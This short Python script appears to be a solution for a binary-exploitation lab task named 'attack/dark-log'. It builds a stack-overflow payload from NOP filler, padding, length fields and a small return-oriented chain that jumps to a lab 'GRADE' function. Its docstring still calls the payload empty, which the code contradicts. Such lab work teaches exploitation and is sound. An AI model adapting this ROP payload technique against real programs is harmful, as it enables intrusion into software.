#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

p64 = lambda x: struct.pack('<Q', x)
p32 = lambda x: struct.pack('<I', x)

CSU, GRADE, RET, N = 0x4018a3, 0x401677, 0x4018a4, 0xA8

chain = p64(RET) + p64(CSU) + p64(4) + p64(GRADE)

payload  = bytearray(b'\x90' * 0x104)
payload[0x00:0x20] = chain 
payload[0x80:0x100] = b'B' * 0x80 
payload[0x100:0x104] = p32(N) 
payload[0x80:0x84] = p32(N)

assert 0x0A not in payload, 'payload 含 0x0a'
assert len(payload) == 0x104

sys.stdout.buffer.write(payload)
